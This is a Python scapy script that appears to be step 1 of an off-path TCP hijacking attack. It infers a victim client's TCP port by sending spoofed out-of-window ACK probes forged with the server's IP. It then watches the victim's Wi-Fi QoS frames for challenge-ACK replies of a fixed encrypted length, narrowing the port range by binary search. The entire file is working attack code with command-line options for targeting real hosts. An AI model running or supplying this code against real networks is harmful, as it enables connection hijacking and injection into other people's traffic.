
import time
import threading
from collections import deque
from typing import List, Optional, Dict

from scapy.all import (
    IP,
    TCP,
    send,
    sniff,
    conf,
)
from scapy.layers.dot11 import Dot11QoS
from scapy.packet import Raw


conf.verb = 0


class PortFinder:
    def __init__(
        self,
        client_ip: str,
        server_ip: str,
        server_port: int,
        start_port: int,
        end_port: int,
        send_if_name: str,
        sniff_if_name: List[str],
        client_mac: str,
        step_size: int = 50,
        packet_repeat: int = 1,
        expected_raw_len: int = 88,
        repeat_time: float = 2.0,
    ):
        self.client_ip = client_ip
        self.server_ip = server_ip
        self.server_port = server_port
        self.start_port = start_port
        self.end_port = end_port
        self.send_if_name = send_if_name
        self.sniff_if_name = sniff_if_name
        self.client_mac = client_mac.lower()

        self.step_size = step_size
        self.packet_repeat = packet_repeat
        self.expected_raw_len = expected_raw_len
        self.repeat_time = repeat_time

        self._hit = False
        self._lock = threading.Lock()
        self.final_port: Optional[int] = None

        self._candidate_queue = deque()


    def _send_ack_probe(self, client_port: int):
        """
        Send two out-of-window ACK probes to trigger challenge ACK.
        """
        seqs = [1, 2 ** 31 + 1]
        for _ in range(self.packet_repeat):
            for seq in seqs:
                pkt = (
                    IP(src=self.server_ip, dst=self.client_ip)
                    / TCP(
                        sport=self.server_port,
                        dport=client_port,
                        flags="A",
                        seq=seq,
                        ack=1,
                    )
                )
                send(pkt, iface=self.send_if_name, verbose=False)

    def _sniff_cb(self, pkt):
        """
        Wi-Fi side-channel detector:
        look for Dot11QoS + Raw with expected encrypted payload length.
        """
        if not pkt.haslayer(Dot11QoS):
            return
        if not pkt.haslayer(Raw):
            return

        raw_len = len(pkt[Raw].load)
        if raw_len != self.expected_raw_len:
            return

        # Optional MAC filtering (best-effort)
        try:
            if hasattr(pkt, "addr2") and pkt.addr2:
                if pkt.addr2.lower() != self.client_mac:
                    return
        except Exception:
            pass

        with self._lock:
            self._hit = True

    def _probe_range(self, l: int, r: int) -> bool:
        """
        Probe client ports in [l, r).
        Returns True if a side-channel hit is observed.
        """
        self._hit = False

        sniffer = threading.Thread(
            target=sniff,
            kwargs={
                "iface": self.sniff_if_name,
                "prn": self._sniff_cb,
                "timeout": 0.5,
                "store": False,
            },
            daemon=True,
        )
        sniffer.start()

        for port in range(l, r, self.step_size):
            self._send_ack_probe(port)

        sniffer.join()

        print(f"[PortFinder] probe range [{l}, {r}) → hit={self._hit}")
        return self._hit



    def run(self):
        """
        Binary-search-like narrowing over client port range.
        """
        self._candidate_queue.append((self.start_port, self.end_port))

        while self._candidate_queue:
            l, r = self._candidate_queue.popleft()
            if r - l <= self.step_size:
                self.final_port = l
                print(f"[PortFinder] final client port ≈ {l}")
                return

            hit = self._probe_range(l, r)
            if not hit:
                continue

            mid = (l + r) // 2
            self._candidate_queue.append((l, mid))
            self._candidate_queue.append((mid, r))

            time.sleep(self.repeat_time)

        print("[PortFinder] no client port identified")



    def get_result(self) -> Optional[int]:
        return self.final_port

    def write_data(self, path: str = "step1_port_finder.log"):
        with open(path, "w") as f:
            f.write(f"client_port={self.final_port}\n")



def run_step1(config: Dict) -> Dict:
    """
    Main-callable Step 1 interface.

    Returns:
        {
          "client_port": int | None,
          "confidence": float,
          "method": str,
          "details": dict
        }
    """
    pf = PortFinder(
        client_ip=config["client_ip"],
        server_ip=config["server_ip"],
        server_port=config["server_port"],
        start_port=config["start_port"],
        end_port=config["end_port"],
        send_if_name=config["send_if_name"],
        sniff_if_name=config["sniff_if_name"],
        client_mac=config["client_mac"],
        step_size=config.get("step_size", 50),
        packet_repeat=config.get("packet_repeat", 1),
        expected_raw_len=config.get("expected_raw_len", 88),
        repeat_time=config.get("repeat_time", 2.0),
    )

    print("[Step1] Starting client port inference")
    pf.run()
    pf.write_data()

    port = pf.get_result()
    if port is None:
        return {
            "client_port": None,
            "confidence": 0.0,
            "method": "wifi-challenge-ack",
            "details": {"status": "no_hit"},
        }

    return {
        "client_port": port,
        "confidence": 0.9,
        "method": "wifi-challenge-ack",
        "details": {
            "range": [config["start_port"], config["end_port"]],
            "step_size": config.get("step_size", 50),
        },
    }




def _parse_args():
    import argparse

    p = argparse.ArgumentParser("Step1: TCP client port inference")
    p.add_argument("--client-ip", required=True)
    p.add_argument("--server-ip", required=True)
    p.add_argument("--server-port", type=int, required=True)
    p.add_argument("--start-port", type=int, required=True)
    p.add_argument("--end-port", type=int, required=True)
    p.add_argument("--send-if", required=True)
    p.add_argument("--sniff-if", action="append", required=True)
    p.add_argument("--client-mac", required=True)
    return p.parse_args()


if __name__ == "__main__":
    args = _parse_args()
    cfg = {
        "client_ip": args.client_ip,
        "server_ip": args.server_ip,
        "server_port": args.server_port,
        "start_port": args.start_port,
        "end_port": args.end_port,
        "send_if_name": args.send_if,
        "sniff_if_name": args.sniff_if,
        "client_mac": args.client_mac,
    }

    res = run_step1(cfg)
    print("[Step1 Result]", res)
